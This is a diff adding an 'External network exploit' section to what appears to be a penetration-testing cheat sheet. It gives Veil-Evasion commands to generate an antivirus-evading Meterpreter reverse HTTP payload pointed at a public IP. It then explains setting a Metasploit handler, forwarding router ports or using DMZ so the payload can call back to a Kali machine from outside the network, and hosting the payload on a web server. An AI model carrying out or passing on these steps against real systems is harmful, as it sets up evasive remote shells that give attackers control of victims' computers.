@@ -49,3 +49,26 @@ use exploit/multi/handler
 show options
 set PAYLOAD windows/meterpreter/reverse_https
 ```
+
+## External network exploit
+
+```
+# VEIL-EVASION
+use cs/meterpreter/rev_http
+SET LPORT 8080
+SET LHOST <REAL_IP> # we do not want to use LAN IP, look for real network ip
+generate
+```
+
+Remember to run `msfconsole` and proper configure _Metasploit handler_'s `PAYLOAD`.
+
+### Configure Router to forward connections to Kali
+
+Access router configuration panel and look for __IP Forwarding__ configuration.
+
+We'll forward connections that come through our selected port (in our example, port `8080`) to the LAN IP of our kali machine (get it with `ifconfig`).
+
+If you plan to host your payload using a web server such as apache from your own machine, you'd probably want to forward requests comming through port `80` too.
+
+An alternative, if your router supports it, is to set your host as __DMZ Host__, so that router forwards all requests to your machine.
+ 
